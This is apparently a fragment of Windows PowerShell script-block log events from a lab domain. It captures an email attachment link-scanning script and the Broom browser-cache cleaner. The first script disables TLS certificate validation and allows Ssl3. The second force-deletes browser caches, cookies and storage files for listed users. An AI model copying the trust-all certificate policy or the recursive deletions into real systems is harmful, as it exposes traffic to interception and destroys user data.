\"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" >> $LOGFILE\n\t\t\t\t}\n\t\t\t\t$global:enable_SecureX = $false\n\t\t\t}\n\t\t}\n\t}\n\tWrite-OutPut \"====================================================================\" >> $LOGFILE\n}\n\nfunction extract_hyperlink_from_Excel {\n\t$URLLIST = @()\n\t$excel = New-Object -ComObject excel.application\n\t$excel.visible = $False\n\t$workbook = $excel.Workbooks.Open($ATTFILENAME)\n\t$workbook.saveas($DOWNLOADDIRECTORY+'temp',44)\n \t#Looping the Workbook sheet to check all the sheets in the Excel\n\tfor ($loop_index = 1; $loop_index -le $workbook.Sheets.Count; $loop_index++)\n\t{\n\t#Assigining the hyperlinks to the Variable from each sheet\n\t\t$Sheet = $workbook.Worksheets($loop_index).Hyperlinks\n\t#looping the Sheet one by one and store it in collection\n\t\t$Sheet | ForEach-Object{ \n\t\t\t$Link = $_.Address\n\t\t\t$URLLIST = $URLLIST += $Link\n\t\t}\n\t}\n\t#Kill the excel\n\t$workbook.close()\n\tStop-Process -name excel\n\tRemove-Item -Path \"$($DOWNLOADDIRECTORY)temp.*\"\n\tRemove-Item -Force -Recurse -Path \"$($DOWNLOADDIRECTORY)temp_files\"\n\t$URLARRAY = @()\n\tforeach ($URL in $URLLIST){ if ( $URL -notin $EXPLIST ){$URLARRAY = $URLARRAY += $URL }}\n\t# URL is not null or empty do check the URL\n\tif ( -not ([string]::IsNullOrEmpty($URLARRAY)) ){\n\t\tforeach($URL in $URLARRAY){\n\t\t\tWrite-OutPut \"URL:     \",$URL >> $LOGFILE\n\t\t\tCheckRedirectedURL\n\t\t}\n\t}\n}\n\nfunction MAIN {\n\tdate\n\tIf(!(test-path $DOWNLOADDIRECTORY)){ New-Item -ItemType directory -Path $DOWNLOADDIRECTORY }\n\tIf(!(test-path $REPORTSDIRECTORY)){ New-Item -ItemType directory -Path $REPORTSDIRECTORY }\n\tImport-Module $EWSDLLPATH\n\t$SERVICE = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService([Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2010_SP2)\n\t$SERVICE.Credentials = New-Object Net.NetworkCredential($USERNAME, $PASSWORD, $DOMAIN)\n\t$SERVICE.AutodiscoverUrl($EMAILADDRESS)\n\t$INBOX = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($SERVICE,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)\n\t$FOLDERROOT = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($SERVICE,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::msgFolderRoot)\n\t$SUBFOLDERID = ($FOLDERROOT.FindFolders([Microsoft.Exchange.WebServices.Data.FolderView]100) | where { $_.DisplayName -eq $SUBFOLDER }).Id\n\t$PROPERTYSET = new-object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)\n\t$PROPERTYSET.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text\n\t[System.Net.ServicePointManager]::SecurityProtocol = @(\"Tls12\",\"Tls11\",\"Tls\",\"Ssl3\")\n#\t[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12\n#\tUse .Net Object to ignore self-signed certificate\n\tif (\"TrustAllCertsPolicy\" -as [type]) {}\n\telse {\n\tAdd-Type @\"\n\tusing System.Net;\n\tusing System.Security.Cryptography.X509Certificates;\n\tpublic class TrustAllCertsPolicy : ICertificatePolicy {\n\t\tpublic bool CheckValidationResult(\n\t\t\tServicePoint srvPoint, X509Certificate certificate,\n\t\t\tWebRequest request, int certificateProblem) {\n\t\t\treturn true;\n\t\t}\n\t}\n\"@\n\t[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n\t}\n\tif ( $INBOX.TotalCount -ne 0 ){\n\t\t$ITEMS = $INBOX.FindItems($INBOX.TotalCount)\n\t\tforeach ( $EMAIL in $ITEMS.Items ){\n\t\t\t# only get unread emails\n\t\t\tif( $EMAIL.isread -eq $false ){\n\t\t\t\tif( ($EMAIL.Subject -ne \"Thank you for contacting the eHealth Saskatchewan Service Desk\") -or ($EMAIL.Subject -ne \"Service Desk Auto Reply for emailsecurity@ehealthsask.ca\") ){\n\t\t\t\t\t# load the property set to get to the body\n\t\t\t\t\t$EMAIL.load($PROPERTYSET)\n\t\t\t\t\t$RANDOMID = -join ((48..57) + (97..122) | Get-Random -Count 20 | % {[char]$_})\n\t\t\t\t\t$LOGFILE = $REPORTSDIRECTORY+\"security-scan-report_\"+$RANDOMID+\".log\"\n\t\t\t\t\t$HTMLREPFILE = $REPORTSDIRECTORY+\"security-scan-report_\"+$RANDOMID+\".html\"\n\t\t\t\t\t$SCREENSHOTFILE = $REPORTSDIRECTORY+\"screenshot_\"+$RANDOMID+\".jpg\"\n\t\t\t\t\t# output the results - first of all the From, Subject and Date Time Received\n\t\t\t\t\tWrite-OutPut \"====================================================================\" > $LOGFILE\n\t\t\t\t\tWrite-OutPut \"From:    $($EMAIL.From)\" >> $LOGFILE\n\t\t\t\t\tWrite-OutPut \"To:    $($EMAIL.ToRecipients)\" >> $LOGFILE\n\t\t\t\t\tWrite-OutPut \"",
                    "ScriptBlockId": "5b10436f-ec14-4c18-b4ca-12f2db33c2be"
                }
            }
        },
        {
            "@timestamp": "2025-12-23T19:01:17.436Z",
            "event": {
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2025-12-23T19:01:17.436338100Z'/><EventRecordID>34443</EventRecordID><Correlation ActivityID='{118041f9-7434-0001-419c-81113474dc01}'/><Execution ProcessID='7128' ThreadID='7496'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>kingslanding.sevenkingdoms.local</Computer><Security UserID='S-1-5-21-2217717690-3992057368-3456976211-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>4</Data><Data Name='ScriptBlockText'>&lt;#PSScriptInfo\r\n\r\n.VERSION 0.25\r\n\r\n.GUID 1b158786-70ac-433f-b3f3-87b9e1baac75\r\n\r\n.AUTHOR An.St.\r\n\r\n.COPYRIGHT  Starinin Andrey (AnSt), 2017\r\n\r\n.LICENSE MIT License\r\n\r\n.LICENSEURI https://github.com/anst-foto/Broom/blob/master/LICENSE\r\n\r\n.PROJECTURI https://github.com/anst-foto/Broom\r\n\r\n.RELEASENOTES\r\n\r\nv0.25:\t   (Try/Catch/Finally)\r\nv0.24:\t    :     \r\nv0.23:\t    (-    EXE-)\r\nv0.22:\t  \r\nv0.21:\t     (Broom_Module.psm1)\r\nv0.20:\t  alias cmdlet\r\nv0.19:\t  \r\nv0.18:\t    \r\nv0.17:    EXE- PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\r\nv0.16:   PSScriptInfo\r\nv0.15:\t    \r\nv0.14:\t   \r\nv0.13:\t ,  \r\nv0.12:\t    (MIT License)\r\nv0.11:\t    \r\nv0.10:\t   \r\nv0.9:\t     \r\nv0.8:\t    \r\nv0.7:\t  ., Opera\r\nv0.6:\t   \r\nv0.5:\t \r\nv0.4:\t    \r\nv0.3:\t  \r\nv0.2:\t   \r\nv0.1:\t \r\n\r\n#&gt;\r\n\r\n&lt;#\r\n.DESCRIPTION \r\n    ,    \r\n#&gt; \r\n\r\nClear-Host\r\n\r\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\r\n\"\"\r\nWrite-Host -ForegroundColor Yellow \"Broom ()\"\r\nWrite-Host -ForegroundColor Yellow \"   ,   \"\r\nWrite-Host -ForegroundColor Yellow \"(c) Starinin Andrey (AnSt). 2017\"\r\nWrite-Host -ForegroundColor Yellow \"MIT License\"\r\nWrite-Host -ForegroundColor Yellow \": 0.25 ( 2018)\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"GitHub - https://github.com/anst-foto/Broom\"\r\nWrite-Host -ForegroundColor Gray \"Gallery TechNet - https://gallery.technet.microsoft.com/PowerShell-f24f32cb\"\r\nWrite-Host -ForegroundColor Gray \"PowerShellGallery - https://www.powershellgallery.com/packages/Broom\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\nWrite-Host -ForegroundColor Gray \"   - https://github.com/lemtek/Powershell\"\r\nWrite-Host -ForegroundColor Gray \"By Lee Bhogal, Paradise Computing Ltd - June 2014\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\nWrite-Host -ForegroundColor Gray \"PS2EXE-GUI - https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-GUI-Convert-e7cb69d5\"\r\nWrite-Host -ForegroundColor Gray \"License: MS-LPL\"\r\nWrite-Host -ForegroundColor Gray \"\"\r\nWrite-Host -ForegroundColor Gray \"PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\r\n\r\nOverworking of the great script of Igor Karstein with GUI support by Markus Scholtes. \r\nThe GUI output and input is activated with one switch, real windows executables are generated.\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\n\"\"\r\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\r\n\"\"\r\n\r\nWrite-Host -ForegroundColor Gray \"*******************************************************\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"MIT License\r\n\r\nCopyright (c) 2017 Starinin Andrey\r\n\r\nPermission is hereby granted, free of charge, to any person obtaining a copy\r\nof this software and associated documentation files (the `'Software`'), to deal\r\nin the Software without restriction, including without limitation the rights\r\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\r\ncopies of the Software, and to permit persons to whom the Software is\r\nfurnished to do so, subject to the following conditions:\r\n\r\nThe above copyright notice and this permission notice shall be included in all\r\ncopies or substantial portions of the Software.\r\n\r\nTHE SOFTWARE IS PROVIDED `'AS IS`', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\nSOFTWARE.\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"*******************************************************\"\r\n\"\"\r\n\r\nWrite-Host -ForegroundColor Green \":\r\nv0.25:\t   (Try/Catch/Finally)\r\nv0.24:\t    :     \r\nv0.23:\t    (-    EXE-)\r\nv0.22:\t  \r\nv0.21:\t     (Broom_Module.psm1)\r\nv0.20:\t  alias cmdlet\r\nv0.19:\t  \r\nv0.18:\t    \r\nv0.17:    EXE- PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\r\nv0.16:   PSScriptInfo\r\nv0.15:\t    \r\nv0.14:\t   \r\nv0.13:\t ,  \r\nv0.12:\t    (MIT License)\r\nv0.11:\t    \r\nv0.10:\t   \r\nv0.9:\t     \r\nv0.8:\t    \r\nv0.7:\t  ., Opera\r\nv0.6:\t   \r\nv0.5:\t \r\nv0.4:\t    \r\nv0.3:\t  \r\nv0.2:\t   \r\nv0.1:\t \"\r\n\"\"\r\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\r\n\"\"\r\n#*******************************************************\r\n\r\n\r\n\r\n#*******************************************************\r\n\r\n# OutFile\r\nFunction OutFile {\r\n\t$PathLog = \"C:\\users\\$env:USERNAME\\broom.log\"\r\n\t$DateLog = Get-Date -Format \"dd MMMM yyyy HH:mm:ss\"\r\n\t$Head1Log = \"------------------------------\"\r\n\t$Head2Log = \"---------------\"\r\n\t$Head3Log = \"-------\"\r\n\t$Title1 = \"   \"\r\n\t$Title2 = \"       (RecycleBin &amp; Temp)\"\r\n\t$Title3 = \"         (RecycleBin &amp; Temp)\"\r\n\t$TitleMozilla = \"Mozilla\"\r\n\t$TitleChrome = \"Chrome\"\r\n\t$TitleChromium = \"Chromium\"\r\n\t$TitleYandex = \"Yandex\"\r\n\t$TitleOpera = \"Opera\"\r\n\t$TitleIE = \"Internet Explorer\"\r\n\t$TitleRecileBinTemp = \"RecileBin &amp; Temp\"\r\n\r\n\t\"\"\r\n    Try {\r\n\t    New-Item -Path $PathLog -ItemType File -ErrorAction SilentlyContinue -Verbose\r\n        }\r\n    Catch {\r\n        Write-Host -ForegroundColor Red \" / log-\"\r\n        }\r\n    Try {\r\n\t    Out-File -FilePath $PathLog -InputObject $Head1Log -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $DateLog -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $Head1Log -Append -Encoding Unicode\r\n        }\r\n    Catch {\r\n        Write-Host -ForegroundColor Red \"   log-\"\r\n        }\r\n}\r\n\r\n# Mozilla Firefox\r\nFunction Clear_Mozilla_OutFile ($a) {\r\n\t#   log-\r\n    Try {\r\n        Out-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $TitleMozilla -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n        } \r\n    Catch {\r\n        Write-Host -ForegroundColor Red \"   log-\"\r\n        }\r\n\t\r\n\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n        Try{\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n\t        Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\thumbnails\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\webappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\chromeappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            }\r\n        Catch {\r\n            Write-Host -ForegroundColor Red \"   Firefox\"\r\n            }\r\n         }\r\n}\r\nFunction Clear_Mozilla ($a) {\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n        Try {\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n\t        Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\thumbnails\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\webappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\chromeappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            }\r\n        Catch {\r\n            Write-Host -ForegroundColor Red \"   Firefox\"\r\n            }\r\n            \r\n        }\r\n}\r\n\r\n# Google Chrome\r\nFunction Clear_Chrome_OutFile ($a) {\r\n\t#   log-\r\n\tTry {\r\n\t\tOut-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n\t\tOut-File -FilePath $PathLog -InputObject $TitleChrome -Append -Encoding Unicode\r\n\t\tOut-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n\t\t}\r\n\tCatch {\r\n        Write-Host -ForegroundColor Red \"   log-\"\r\n        }\r\n\t\r\n\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n\t\tTry {\r\n\t\t\tRemove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies-Journal\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\ChromeDWriteFontCache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n\t\t\t}\r\n\t\tCatch {\r\n\t\t\tWrite-Host -ForegroundColor Red \"   Chrome\"\r\n\t\t\t}\r\n            \r\n        }\r\n}\r\nFunction Clear_Chrome ($a) {\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n\t\tTry {\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C</Data><Data Name='ScriptBlockId'>efeae38c-61bc-441a-801d-dedbe9eabd03</Data><Data Name='Path'>C:\\Users\\vagrant\\posh\\Broom.ps1</Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 4):\r\n&lt;#PSScriptInfo\r\n\r\n.VERSION 0.25\r\n\r\n.GUID 1b158786-70ac-433f-b3f3-87b9e1baac75\r\n\r\n.AUTHOR An.St.\r\n\r\n.COPYRIGHT  Starinin Andrey (AnSt), 2017\r\n\r\n.LICENSE MIT License\r\n\r\n.LICENSEURI https://github.com/anst-foto/Broom/blob/master/LICENSE\r\n\r\n.PROJECTURI https://github.com/anst-foto/Broom\r\n\r\n.RELEASENOTES\r\n\r\nv0.25:\t   (Try/Catch/Finally)\r\nv0.24:\t    :     \r\nv0.23:\t    (-    EXE-)\r\nv0.22:\t  \r\nv0.21:\t     (Broom_Module.psm1)\r\nv0.20:\t  alias cmdlet\r\nv0.19:\t  \r\nv0.18:\t    \r\nv0.17:    EXE- PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\r\nv0.16:   PSScriptInfo\r\nv0.15:\t    \r\nv0.14:\t   \r\nv0.13:\t ,  \r\nv0.12:\t    (MIT License)\r\nv0.11:\t    \r\nv0.10:\t   \r\nv0.9:\t     \r\nv0.8:\t    \r\nv0.7:\t  ., Opera\r\nv0.6:\t   \r\nv0.5:\t \r\nv0.4:\t    \r\nv0.3:\t  \r\nv0.2:\t   \r\nv0.1:\t \r\n\r\n#&gt;\r\n\r\n&lt;#\r\n.DESCRIPTION \r\n    ,    \r\n#&gt; \r\n\r\nClear-Host\r\n\r\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\r\n\"\"\r\nWrite-Host -ForegroundColor Yellow \"Broom ()\"\r\nWrite-Host -ForegroundColor Yellow \"   ,   \"\r\nWrite-Host -ForegroundColor Yellow \"(c) Starinin Andrey (AnSt). 2017\"\r\nWrite-Host -ForegroundColor Yellow \"MIT License\"\r\nWrite-Host -ForegroundColor Yellow \": 0.25 ( 2018)\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"GitHub - https://github.com/anst-foto/Broom\"\r\nWrite-Host -ForegroundColor Gray \"Gallery TechNet - https://gallery.technet.microsoft.com/PowerShell-f24f32cb\"\r\nWrite-Host -ForegroundColor Gray \"PowerShellGallery - https://www.powershellgallery.com/packages/Broom\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\nWrite-Host -ForegroundColor Gray \"   - https://github.com/lemtek/Powershell\"\r\nWrite-Host -ForegroundColor Gray \"By Lee Bhogal, Paradise Computing Ltd - June 2014\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\nWrite-Host -ForegroundColor Gray \"PS2EXE-GUI - https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-GUI-Convert-e7cb69d5\"\r\nWrite-Host -ForegroundColor Gray \"License: MS-LPL\"\r\nWrite-Host -ForegroundColor Gray \"\"\r\nWrite-Host -ForegroundColor Gray \"PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\r\n\r\nOverworking of the great script of Igor Karstein with GUI support by Markus Scholtes. \r\nThe GUI output and input is activated with one switch, real windows executables are generated.\"\r\nWrite-Host -ForegroundColor Gray \"***\"\r\n\"\"\r\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\r\n\"\"\r\n\r\nWrite-Host -ForegroundColor Gray \"*******************************************************\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"MIT License\r\n\r\nCopyright (c) 2017 Starinin Andrey\r\n\r\nPermission is hereby granted, free of charge, to any person obtaining a copy\r\nof this software and associated documentation files (the `'Software`'), to deal\r\nin the Software without restriction, including without limitation the rights\r\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\r\ncopies of the Software, and to permit persons to whom the Software is\r\nfurnished to do so, subject to the following conditions:\r\n\r\nThe above copyright notice and this permission notice shall be included in all\r\ncopies or substantial portions of the Software.\r\n\r\nTHE SOFTWARE IS PROVIDED `'AS IS`', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\nSOFTWARE.\"\r\n\"\"\r\nWrite-Host -ForegroundColor Gray \"*******************************************************\"\r\n\"\"\r\n\r\nWrite-Host -ForegroundColor Green \":\r\nv0.25:\t   (Try/Catch/Finally)\r\nv0.24:\t    :     \r\nv0.23:\t    (-    EXE-)\r\nv0.22:\t  \r\nv0.21:\t     (Broom_Module.psm1)\r\nv0.20:\t  alias cmdlet\r\nv0.19:\t  \r\nv0.18:\t    \r\nv0.17:    EXE- PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\r\nv0.16:   PSScriptInfo\r\nv0.15:\t    \r\nv0.14:\t   \r\nv0.13:\t ,  \r\nv0.12:\t    (MIT License)\r\nv0.11:\t    \r\nv0.10:\t   \r\nv0.9:\t     \r\nv0.8:\t    \r\nv0.7:\t  ., Opera\r\nv0.6:\t   \r\nv0.5:\t \r\nv0.4:\t    \r\nv0.3:\t  \r\nv0.2:\t   \r\nv0.1:\t \"\r\n\"\"\r\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\r\n\"\"\r\n#*******************************************************\r\n\r\n\r\n\r\n#*******************************************************\r\n\r\n# OutFile\r\nFunction OutFile {\r\n\t$PathLog = \"C:\\users\\$env:USERNAME\\broom.log\"\r\n\t$DateLog = Get-Date -Format \"dd MMMM yyyy HH:mm:ss\"\r\n\t$Head1Log = \"------------------------------\"\r\n\t$Head2Log = \"---------------\"\r\n\t$Head3Log = \"-------\"\r\n\t$Title1 = \"   \"\r\n\t$Title2 = \"       (RecycleBin &amp; Temp)\"\r\n\t$Title3 = \"         (RecycleBin &amp; Temp)\"\r\n\t$TitleMozilla = \"Mozilla\"\r\n\t$TitleChrome = \"Chrome\"\r\n\t$TitleChromium = \"Chromium\"\r\n\t$TitleYandex = \"Yandex\"\r\n\t$TitleOpera = \"Opera\"\r\n\t$TitleIE = \"Internet Explorer\"\r\n\t$TitleRecileBinTemp = \"RecileBin &amp; Temp\"\r\n\r\n\t\"\"\r\n    Try {\r\n\t    New-Item -Path $PathLog -ItemType File -ErrorAction SilentlyContinue -Verbose\r\n        }\r\n    Catch {\r\n        Write-Host -ForegroundColor Red \" / log-\"\r\n        }\r\n    Try {\r\n\t    Out-File -FilePath $PathLog -InputObject $Head1Log -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $DateLog -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $Head1Log -Append -Encoding Unicode\r\n        }\r\n    Catch {\r\n        Write-Host -ForegroundColor Red \"   log-\"\r\n        }\r\n}\r\n\r\n# Mozilla Firefox\r\nFunction Clear_Mozilla_OutFile ($a) {\r\n\t#   log-\r\n    Try {\r\n        Out-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $TitleMozilla -Append -Encoding Unicode\r\n\t    Out-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n        } \r\n    Catch {\r\n        Write-Host -ForegroundColor Red \"   log-\"\r\n        }\r\n\t\r\n\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n        Try{\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n\t        Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\thumbnails\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\webappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\chromeappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            }\r\n        Catch {\r\n            Write-Host -ForegroundColor Red \"   Firefox\"\r\n            